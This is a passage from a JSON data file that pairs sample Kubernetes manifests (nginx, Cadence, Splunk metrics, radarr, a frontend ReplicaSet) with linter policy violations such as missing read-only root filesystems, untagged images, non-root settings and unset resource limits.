    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10709",
    "manifest_path": "data/manifests/the_stack_sample/sample_4121.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2830\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10710",
    "manifest_path": "data/manifests/the_stack_sample/sample_4121.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2830\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10711",
    "manifest_path": "data/manifests/the_stack_sample/sample_4121.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2830\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10712",
    "manifest_path": "data/manifests/the_stack_sample/sample_4121.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-2830\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10713",
    "manifest_path": "data/manifests/the_stack_sample/sample_4125.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cadence\n  labels:\n    app: cadence\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: cadence\n  template:\n    metadata:\n      labels:\n        app: cadence\n    spec:\n      containers:\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.14\n        command:\n        - /cloud_sql_proxy\n        - -instances=snap-cadence-dev:us-central1:cadence-db=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      - name: cadence\n        image: ubercadence/server:0.11.0-auto-setup\n        ports:\n        - containerPort: 7933\n        - containerPort: 7934\n        - containerPort: 7935\n        - containerPort: 7939\n        env:\n        - name: NUM_HISTORY_SHARDS\n          value: '128'\n        - name: RINGPOP_BOOTSTRAP_MODE\n          value: hosts\n        - name: RINGPOP_SEEDS\n          value: 10.53.34.77:17933\n        - name: DB\n          value: mysql\n        - name: DYNAMIC_CONFIG_FILE_PATH\n          value: config/dynamicconfig/development.yaml\n        - name: MYSQL_PWD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        - name: MYSQL_SEEDS\n          value: 127.0.0.1\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: MYSQL_TX_ISOLATION_COMPAT\n          value: 'true'\n        - name: STATSD_ENDPOINT\n          value: statsd:8125\n      volumes:\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10714",
    "manifest_path": "data/manifests/the_stack_sample/sample_4125.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cadence\n  labels:\n    app: cadence\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: cadence\n  template:\n    metadata:\n      labels:\n        app: cadence\n    spec:\n      containers:\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.14\n        command:\n        - /cloud_sql_proxy\n        - -instances=snap-cadence-dev:us-central1:cadence-db=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      - name: cadence\n        image: ubercadence/server:0.11.0-auto-setup\n        ports:\n        - containerPort: 7933\n        - containerPort: 7934\n        - containerPort: 7935\n        - containerPort: 7939\n        env:\n        - name: NUM_HISTORY_SHARDS\n          value: '128'\n        - name: RINGPOP_BOOTSTRAP_MODE\n          value: hosts\n        - name: RINGPOP_SEEDS\n          value: 10.53.34.77:17933\n        - name: DB\n          value: mysql\n        - name: DYNAMIC_CONFIG_FILE_PATH\n          value: config/dynamicconfig/development.yaml\n        - name: MYSQL_PWD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        - name: MYSQL_SEEDS\n          value: 127.0.0.1\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: MYSQL_TX_ISOLATION_COMPAT\n          value: 'true'\n        - name: STATSD_ENDPOINT\n          value: statsd:8125\n      volumes:\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cadence\" does not have a read-only root file system"
  },
  {
    "id": "10715",
    "manifest_path": "data/manifests/the_stack_sample/sample_4125.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cadence\n  labels:\n    app: cadence\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: cadence\n  template:\n    metadata:\n      labels:\n        app: cadence\n    spec:\n      containers:\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.14\n        command:\n        - /cloud_sql_proxy\n        - -instances=snap-cadence-dev:us-central1:cadence-db=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      - name: cadence\n        image: ubercadence/server:0.11.0-auto-setup\n        ports:\n        - containerPort: 7933\n        - containerPort: 7934\n        - containerPort: 7935\n        - containerPort: 7939\n        env:\n        - name: NUM_HISTORY_SHARDS\n          value: '128'\n        - name: RINGPOP_BOOTSTRAP_MODE\n          value: hosts\n        - name: RINGPOP_SEEDS\n          value: 10.53.34.77:17933\n        - name: DB\n          value: mysql\n        - name: DYNAMIC_CONFIG_FILE_PATH\n          value: config/dynamicconfig/development.yaml\n        - name: MYSQL_PWD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        - name: MYSQL_SEEDS\n          value: 127.0.0.1\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: MYSQL_TX_ISOLATION_COMPAT\n          value: 'true'\n        - name: STATSD_ENDPOINT\n          value: statsd:8125\n      volumes:\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cloudsql-proxy\" does not have a read-only root file system"
  },
  {
    "id": "10716",
    "manifest_path": "data/manifests/the_stack_sample/sample_4125.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cadence\n  labels:\n    app: cadence\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: cadence\n  template:\n    metadata:\n      labels:\n        app: cadence\n    spec:\n      containers:\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.14\n        command:\n        - /cloud_sql_proxy\n        - -instances=snap-cadence-dev:us-central1:cadence-db=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      - name: cadence\n        image: ubercadence/server:0.11.0-auto-setup\n        ports:\n        - containerPort: 7933\n        - containerPort: 7934\n        - containerPort: 7935\n        - containerPort: 7939\n        env:\n        - name: NUM_HISTORY_SHARDS\n          value: '128'\n        - name: RINGPOP_BOOTSTRAP_MODE\n          value: hosts\n        - name: RINGPOP_SEEDS\n          value: 10.53.34.77:17933\n        - name: DB\n          value: mysql\n        - name: DYNAMIC_CONFIG_FILE_PATH\n          value: config/dynamicconfig/development.yaml\n        - name: MYSQL_PWD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        - name: MYSQL_SEEDS\n          value: 127.0.0.1\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: MYSQL_TX_ISOLATION_COMPAT\n          value: 'true'\n        - name: STATSD_ENDPOINT\n          value: statsd:8125\n      volumes:\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cadence\" is not set to runAsNonRoot"
  },
  {
    "id": "10717",
    "manifest_path": "data/manifests/the_stack_sample/sample_4125.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cadence\n  labels:\n    app: cadence\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: cadence\n  template:\n    metadata:\n      labels:\n        app: cadence\n    spec:\n      containers:\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.14\n        command:\n        - /cloud_sql_proxy\n        - -instances=snap-cadence-dev:us-central1:cadence-db=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      - name: cadence\n        image: ubercadence/server:0.11.0-auto-setup\n        ports:\n        - containerPort: 7933\n        - containerPort: 7934\n        - containerPort: 7935\n        - containerPort: 7939\n        env:\n        - name: NUM_HISTORY_SHARDS\n          value: '128'\n        - name: RINGPOP_BOOTSTRAP_MODE\n          value: hosts\n        - name: RINGPOP_SEEDS\n          value: 10.53.34.77:17933\n        - name: DB\n          value: mysql\n        - name: DYNAMIC_CONFIG_FILE_PATH\n          value: config/dynamicconfig/development.yaml\n        - name: MYSQL_PWD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        - name: MYSQL_SEEDS\n          value: 127.0.0.1\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: MYSQL_TX_ISOLATION_COMPAT\n          value: 'true'\n        - name: STATSD_ENDPOINT\n          value: statsd:8125\n      volumes:\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cadence\" has cpu request 0"
  },
  {
    "id": "10718",
    "manifest_path": "data/manifests/the_stack_sample/sample_4125.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cadence\n  labels:\n    app: cadence\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: cadence\n  template:\n    metadata:\n      labels:\n        app: cadence\n    spec:\n      containers:\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.14\n        command:\n        - /cloud_sql_proxy\n        - -instances=snap-cadence-dev:us-central1:cadence-db=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      - name: cadence\n        image: ubercadence/server:0.11.0-auto-setup\n        ports:\n        - containerPort: 7933\n        - containerPort: 7934\n        - containerPort: 7935\n        - containerPort: 7939\n        env:\n        - name: NUM_HISTORY_SHARDS\n          value: '128'\n        - name: RINGPOP_BOOTSTRAP_MODE\n          value: hosts\n        - name: RINGPOP_SEEDS\n          value: 10.53.34.77:17933\n        - name: DB\n          value: mysql\n        - name: DYNAMIC_CONFIG_FILE_PATH\n          value: config/dynamicconfig/development.yaml\n        - name: MYSQL_PWD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        - name: MYSQL_SEEDS\n          value: 127.0.0.1\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: MYSQL_TX_ISOLATION_COMPAT\n          value: 'true'\n        - name: STATSD_ENDPOINT\n          value: statsd:8125\n      volumes:\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cloudsql-proxy\" has cpu request 0"
  },
  {
    "id": "10719",
    "manifest_path": "data/manifests/the_stack_sample/sample_4125.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cadence\n  labels:\n    app: cadence\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: cadence\n  template:\n    metadata:\n      labels:\n        app: cadence\n    spec:\n      containers:\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.14\n        command:\n        - /cloud_sql_proxy\n        - -instances=snap-cadence-dev:us-central1:cadence-db=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      - name: cadence\n        image: ubercadence/server:0.11.0-auto-setup\n        ports:\n        - containerPort: 7933\n        - containerPort: 7934\n        - containerPort: 7935\n        - containerPort: 7939\n        env:\n        - name: NUM_HISTORY_SHARDS\n          value: '128'\n        - name: RINGPOP_BOOTSTRAP_MODE\n          value: hosts\n        - name: RINGPOP_SEEDS\n          value: 10.53.34.77:17933\n        - name: DB\n          value: mysql\n        - name: DYNAMIC_CONFIG_FILE_PATH\n          value: config/dynamicconfig/development.yaml\n        - name: MYSQL_PWD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        - name: MYSQL_SEEDS\n          value: 127.0.0.1\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: MYSQL_TX_ISOLATION_COMPAT\n          value: 'true'\n        - name: STATSD_ENDPOINT\n          value: statsd:8125\n      volumes:\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cadence\" has memory limit 0"
  },
  {
    "id": "10720",
    "manifest_path": "data/manifests/the_stack_sample/sample_4125.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: cadence\n  labels:\n    app: cadence\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: cadence\n  template:\n    metadata:\n      labels:\n        app: cadence\n    spec:\n      containers:\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:1.14\n        command:\n        - /cloud_sql_proxy\n        - -instances=snap-cadence-dev:us-central1:cadence-db=tcp:3306\n        - -credential_file=/secrets/cloudsql/key.json\n        securityContext:\n          runAsUser: 2\n          allowPrivilegeEscalation: false\n        volumeMounts:\n        - name: cloudsql-instance-credentials\n          mountPath: /secrets/cloudsql\n          readOnly: true\n      - name: cadence\n        image: ubercadence/server:0.11.0-auto-setup\n        ports:\n        - containerPort: 7933\n        - containerPort: 7934\n        - containerPort: 7935\n        - containerPort: 7939\n        env:\n        - name: NUM_HISTORY_SHARDS\n          value: '128'\n        - name: RINGPOP_BOOTSTRAP_MODE\n          value: hosts\n        - name: RINGPOP_SEEDS\n          value: 10.53.34.77:17933\n        - name: DB\n          value: mysql\n        - name: DYNAMIC_CONFIG_FILE_PATH\n          value: config/dynamicconfig/development.yaml\n        - name: MYSQL_PWD\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: password\n        - name: MYSQL_SEEDS\n          value: 127.0.0.1\n        - name: MYSQL_USER\n          valueFrom:\n            secretKeyRef:\n              name: cloudsql-db-credentials\n              key: username\n        - name: MYSQL_TX_ISOLATION_COMPAT\n          value: 'true'\n        - name: STATSD_ENDPOINT\n          value: statsd:8125\n      volumes:\n      - name: cloudsql-instance-credentials\n        secret:\n          secretName: cloudsql-instance-credentials\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cloudsql-proxy\" has memory limit 0"
  },
  {
    "id": "10721",
    "manifest_path": "data/manifests/the_stack_sample/sample_4127.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: splunk-kubernetes-metrics\n  labels:\n    app: splunk-kubernetes-metrics\n    engine: fluentd\n    version: 1.2.0\nspec:\n  selector:\n    matchLabels:\n      name: splunk-kubernetes-metrics\n      version: 1.2.0\n  template:\n    metadata:\n      name: splunk-kubernetes-metrics\n      labels:\n        name: splunk-kubernetes-metrics\n        app: splunk-kubernetes-metrics\n        engine: fluentd\n        version: 1.2.0\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n    spec:\n      serviceAccountName: splunk-kubernetes-metrics\n      containers:\n      - name: splunk-fluentd-k8s-metrics\n        image: splunk/k8s-metrics:1.1.1\n        imagePullPolicy: Always\n        env:\n        - name: KUBERNETES_NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: SPLUNK_HEC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-kubernetes-metrics\n              key: splunk_hec_token\n        resources:\n          limits:\n            cpu: 200m\n            memory: 300Mi\n          requests:\n            cpu: 200m\n            memory: 300Mi\n        volumeMounts:\n        - name: conf-configmap\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      volumes:\n      - name: conf-configmap\n        configMap:\n          name: splunk-kubernetes-metrics\n      - name: secrets\n        secret:\n          secretName: splunk-kubernetes-metrics\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"splunk-fluentd-k8s-metrics\" does not have a read-only root file system"
  },
  {
    "id": "10722",
    "manifest_path": "data/manifests/the_stack_sample/sample_4127.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: splunk-kubernetes-metrics\n  labels:\n    app: splunk-kubernetes-metrics\n    engine: fluentd\n    version: 1.2.0\nspec:\n  selector:\n    matchLabels:\n      name: splunk-kubernetes-metrics\n      version: 1.2.0\n  template:\n    metadata:\n      name: splunk-kubernetes-metrics\n      labels:\n        name: splunk-kubernetes-metrics\n        app: splunk-kubernetes-metrics\n        engine: fluentd\n        version: 1.2.0\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n    spec:\n      serviceAccountName: splunk-kubernetes-metrics\n      containers:\n      - name: splunk-fluentd-k8s-metrics\n        image: splunk/k8s-metrics:1.1.1\n        imagePullPolicy: Always\n        env:\n        - name: KUBERNETES_NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: SPLUNK_HEC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-kubernetes-metrics\n              key: splunk_hec_token\n        resources:\n          limits:\n            cpu: 200m\n            memory: 300Mi\n          requests:\n            cpu: 200m\n            memory: 300Mi\n        volumeMounts:\n        - name: conf-configmap\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      volumes:\n      - name: conf-configmap\n        configMap:\n          name: splunk-kubernetes-metrics\n      - name: secrets\n        secret:\n          secretName: splunk-kubernetes-metrics\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"splunk-kubernetes-metrics\" not found"
  },
  {
    "id": "10723",
    "manifest_path": "data/manifests/the_stack_sample/sample_4127.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: splunk-kubernetes-metrics\n  labels:\n    app: splunk-kubernetes-metrics\n    engine: fluentd\n    version: 1.2.0\nspec:\n  selector:\n    matchLabels:\n      name: splunk-kubernetes-metrics\n      version: 1.2.0\n  template:\n    metadata:\n      name: splunk-kubernetes-metrics\n      labels:\n        name: splunk-kubernetes-metrics\n        app: splunk-kubernetes-metrics\n        engine: fluentd\n        version: 1.2.0\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n    spec:\n      serviceAccountName: splunk-kubernetes-metrics\n      containers:\n      - name: splunk-fluentd-k8s-metrics\n        image: splunk/k8s-metrics:1.1.1\n        imagePullPolicy: Always\n        env:\n        - name: KUBERNETES_NODE_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.hostIP\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: SPLUNK_HEC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: splunk-kubernetes-metrics\n              key: splunk_hec_token\n        resources:\n          limits:\n            cpu: 200m\n            memory: 300Mi\n          requests:\n            cpu: 200m\n            memory: 300Mi\n        volumeMounts:\n        - name: conf-configmap\n          mountPath: /fluentd/etc\n        - name: secrets\n          mountPath: /fluentd/etc/splunk\n          readOnly: true\n      volumes:\n      - name: conf-configmap\n        configMap:\n          name: splunk-kubernetes-metrics\n      - name: secrets\n        secret:\n          secretName: splunk-kubernetes-metrics\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"splunk-fluentd-k8s-metrics\" is not set to runAsNonRoot"
  },
  {
    "id": "10724",
    "manifest_path": "data/manifests/the_stack_sample/sample_4128.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-e543\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-e543\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-e543\n    spec:\n      containers:\n      - name: tdedahaks-e543\n        image: deepak2121.azurecr.io/tdedahakse543\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"tdedahaks-e543\" is using an invalid container image, \"deepak2121.azurecr.io/tdedahakse543\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10725",
    "manifest_path": "data/manifests/the_stack_sample/sample_4128.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-e543\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-e543\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-e543\n    spec:\n      containers:\n      - name: tdedahaks-e543\n        image: deepak2121.azurecr.io/tdedahakse543\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10726",
    "manifest_path": "data/manifests/the_stack_sample/sample_4128.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-e543\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-e543\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-e543\n    spec:\n      containers:\n      - name: tdedahaks-e543\n        image: deepak2121.azurecr.io/tdedahakse543\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"tdedahaks-e543\" does not have a read-only root file system"
  },
  {
    "id": "10727",
    "manifest_path": "data/manifests/the_stack_sample/sample_4128.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-e543\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-e543\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-e543\n    spec:\n      containers:\n      - name: tdedahaks-e543\n        image: deepak2121.azurecr.io/tdedahakse543\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"tdedahaks-e543\" is not set to runAsNonRoot"
  },
  {
    "id": "10728",
    "manifest_path": "data/manifests/the_stack_sample/sample_4128.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-e543\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-e543\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-e543\n    spec:\n      containers:\n      - name: tdedahaks-e543\n        image: deepak2121.azurecr.io/tdedahakse543\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"tdedahaks-e543\" has cpu request 0"
  },
  {
    "id": "10729",
    "manifest_path": "data/manifests/the_stack_sample/sample_4128.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: tdedahaks-e543\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: tdedahaks-e543\n  template:\n    metadata:\n      labels:\n        app: tdedahaks-e543\n    spec:\n      containers:\n      - name: tdedahaks-e543\n        image: deepak2121.azurecr.io/tdedahakse543\n        ports:\n        - containerPort: 4000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"tdedahaks-e543\" has memory limit 0"
  },
  {
    "id": "10730",
    "manifest_path": "data/manifests/the_stack_sample/sample_4129.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: radarr\n  labels:\n    app.kubernetes.io/name: radarr\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: radarr\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: radarr\n      annotations:\n        diun.enable: 'true'\n    spec:\n      containers:\n      - name: radarr\n        image: ghcr.io/k8s-at-home/radarr:v3.2.2.5080\n        imagePullPolicy: IfNotPresent\n        resources:\n          requests:\n            cpu: 50m\n            memory: 250Mi\n          limits:\n            cpu: 300m\n            memory: 500Mi\n        ports:\n        - name: radarr-port\n          protocol: TCP\n          containerPort: 7878\n        volumeMounts:\n        - name: radarr-config\n          mountPath: /config\n        - name: radarr-media\n          mountPath: /movies\n          subPath: Movies\n        - name: radarr-downloads\n          mountPath: /downloads\n        livenessProbe:\n          tcpSocket:\n            port: radarr-port\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          tcpSocket:\n            port: radarr-port\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          periodSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        env:\n        - name: TZ\n          value: ${CONFIG_TIMEZONE}\n      securityContext:\n        runAsUser: 1000\n        runAsGroup: 1000\n        fsGroup: 1000\n        fsGroupChangePolicy: OnRootMismatch\n      volumes:\n      - name: radarr-config\n        persistentVolumeClaim:\n          claimName: radarr-config\n      - name: radarr-media\n        persistentVolumeClaim:\n          claimName: shared-media\n      - name: radarr-downloads\n        persistentVolumeClaim:\n          claimName: shared-downloads\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"radarr\" does not have a read-only root file system"
  },
  {
    "id": "10731",
    "manifest_path": "data/manifests/the_stack_sample/sample_4130.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  name: frontend\n  labels:\n    app: frontend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: frontend\n        tier: frontend\n    spec:\n      containers:\n      - name: server\n        image: aosipenko99/frontend:v0.0.2\n        env:\n        - name: PORT\n          value: '8080'\n        - name: PRODUCT_CATALOG_SERVICE_ADDR\n          value: productcatalogservice:3550\n        - name: CURRENCY_SERVICE_ADDR\n          value: currencyservice:7000\n        - name: CART_SERVICE_ADDR\n          value: cartservice:7070\n        - name: RECOMMENDATION_SERVICE_ADDR\n          value: recommendationservice:8080\n        - name: SHIPPING_SERVICE_ADDR\n          value: shippingservice:50051\n        - name: CHECKOUT_SERVICE_ADDR\n          value: checkoutservice:5050\n        - name: AD_SERVICE_ADDR\n          value: adservice:9555\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10732",
    "manifest_path": "data/manifests/the_stack_sample/sample_4130.yaml",
